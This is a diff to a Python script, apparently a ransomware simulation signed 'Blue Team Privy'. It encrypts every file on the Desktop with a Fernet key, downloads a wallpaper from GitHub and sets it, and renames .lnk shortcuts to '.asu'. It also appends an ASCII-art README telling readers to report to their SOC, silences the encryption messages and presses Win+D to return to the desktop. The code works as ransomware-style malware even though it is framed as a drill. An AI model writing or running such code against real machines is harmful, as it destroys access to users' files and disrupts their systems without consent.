@@ -3,6 +3,8 @@ import os
 import ctypes
 import platform
 import urllib.request
+import pyautogui
+import shutil
 
 # Generate key
 key=Fernet.generate_key()
@@ -34,7 +36,7 @@ desktop = os.path.join(home_directory, "Desktop")
 os.chdir(desktop)
 
 # Save key to file
-with open("key.key","wb") as f:
+with open("JANGAN-HAPUS-INI.key","wb") as f:
     f.write(key)
 
 # Create Fernet object with the generated key
@@ -56,8 +58,8 @@ def encrypt():
 
                     with open(file_path, "wb") as f:
                         f.write(encrypted)
-
-                    print(f"Encrypted {file_name} on the Desktop.")
+                    # print(f"Encrypted {file_name} on the Desktop.")
+                        
     except FileNotFoundError:
         print("Error encrypting files. Desktop directory not found.")
 
@@ -85,10 +87,79 @@ def change_wallpaper(file_path):
     else:
         print("Unsupported operating system.")
 
+# Add readme text
+def add_readme(file_path):
+    readme_text = """
+    
+ /$$   /$$           /$$ /$$                 /$$$$$$$$        /$$ /$$                       
+| $$  | $$          | $$| $$                | $$_____/       | $$| $$                       
+| $$  | $$  /$$$$$$ | $$| $$  /$$$$$$       | $$     /$$$$$$ | $$| $$  /$$$$$$   /$$$$$$$   
+| $$$$$$$$ /$$__  $$| $$| $$ /$$__  $$      | $$$$$ /$$__  $$| $$| $$ |____  $$ /$$_____/   
+| $$__  $$| $$$$$$$$| $$| $$| $$  \ $$      | $$__/| $$$$$$$$| $$| $$  /$$$$$$$|  $$$$$$    
+| $$  | $$| $$_____/| $$| $$| $$  | $$      | $$   | $$_____/| $$| $$ /$$__  $$ \____  $$   
+| $$  | $$|  $$$$$$$| $$| $$|  $$$$$$/      | $$   |  $$$$$$$| $$| $$|  $$$$$$$ /$$$$$$$//$$
+|__/  |__/ \_______/|__/|__/ \______/       |__/    \_______/|__/|__/ \_______/|_______/| $/
+                                                                                        |_/ 
+                                                                                            
+                                                                                            
+This is the README file Blue Team Privy.
+
+Don't be afraid, everything was under control. 
+If you read this message, please report to our SOC and let them handle it.
+Keep update your OS and stay aware about everything.
+
+Until next time,
+Blue Team Privy
+
+"""
+
+    try:
+        # Open the file in append mode (or create it if it doesn't exist)
+        with open(file_path, 'a') as file:
+            file.write(readme_text)
+        # print(f"README added to {file_path}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Change icon in Desktop
+def change_shortcut_extension(desktop_directory, old_extension, new_extension):
+
+    try:
+        # Ensure the Desktop directory exists
+        if not os.path.exists(desktop_directory):
+            print(f"Desktop directory not found: {desktop_directory}")
+            return
+
+        # List files on the desktop
+        files = [f for f in os.listdir(desktop_directory) if os.path.isfile(os.path.join(desktop_directory, f))]
+
+        # Rename shortcut files with the old extension to have the new extension
+        for file_name in files:
+            if file_name.lower().endswith(old_extension.lower()):
+                old_path = os.path.join(desktop_directory, file_name)
+                new_path = os.path.join(desktop_directory, f"{os.path.splitext(file_name)[0]}.{new_extension}")
+
+                shutil.move(old_path, new_path)
+                print(f"Renamed {file_name} to {os.path.basename(new_path)}")
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+# Back to desktop
+def backDesktop():
+    # Simulate pressing Win + D
+    pyautogui.hotkey('winleft', 'd')
+
 if __name__ == "__main__":
     wallpaper_url = "https://raw.githubusercontent.com/tompilooo/EncryptFile/main/bt.jpg"
     download_path = os.path.abspath("bt.jpg")
-
+    file_path = os.path.abspath("README.txt")
+    
+    desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")
+    old_extension = ".lnk"  # Change to your desired old extension
+    new_extension = "asu"   # Change to your desired new extension
+    
     # Desktop directory
     # change_to_desktop()
 
@@ -101,5 +172,14 @@ if __name__ == "__main__":
     # Change the wallpaper using the downloaded file
     change_wallpaper(download_path)
 
+    # Call the function to change shortcut extensions
+    change_shortcut_extension(desktop_directory, old_extension, new_extension)
+
+    # Call the function to add README text
+    add_readme(file_path)
+
     # Optionally, remove the downloaded file after changing the wallpaper
     os.remove(download_path)
+
+    #Back to Desktop
+    backDesktop()
